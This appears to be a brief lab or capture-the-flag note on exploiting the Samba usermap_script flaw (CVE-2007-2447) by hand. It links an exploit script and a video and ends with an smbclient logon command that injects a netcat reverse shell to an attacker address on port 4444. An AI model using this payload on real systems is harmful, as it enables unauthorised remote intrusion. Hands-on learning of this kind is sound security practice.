here after searching for smb version on searchsploit i found an exploit for remote code execution

it was easily exploitable using msf but was looking for manual exploit


found a decent resource

https://github.com/amriunix/CVE-2007-2447/blob/master/usermap_script.py#L13


but wanted manul exploitation


checked how the code works  

i identified i can inject the reverse shell code in username field but was not able to workout how

but didnt workout for me so i searched for a video tutorial



Found this video:https://www.youtube.com/watch?v=-adLfUb2pks

and this

understood i have to inject this in smb anonymous session to get a shell on port 4444

(Note: check for typo errors)

smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.48 4444`"
